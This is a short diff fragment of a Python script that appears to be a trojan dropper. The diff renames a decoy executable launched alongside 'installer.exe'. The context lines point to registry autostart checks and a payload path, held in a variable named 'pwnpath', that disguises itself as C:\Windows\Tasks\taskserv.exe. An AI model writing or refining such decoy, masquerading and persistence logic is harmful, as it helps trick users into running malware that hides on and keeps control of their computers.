@@ -46,7 +46,7 @@ def check_autostart_registry(value_name):
     return False
 
 subprocess.Popen(resource_path('installer.exe'))
-subprocess.Popen(resource_path('phony-bin.exe'))
+subprocess.Popen(resource_path('decoy.exe'))
 
 pwnpath = r'C:\Windows\Tasks\taskserv.exe'
 ppath = Path(pwnpath)
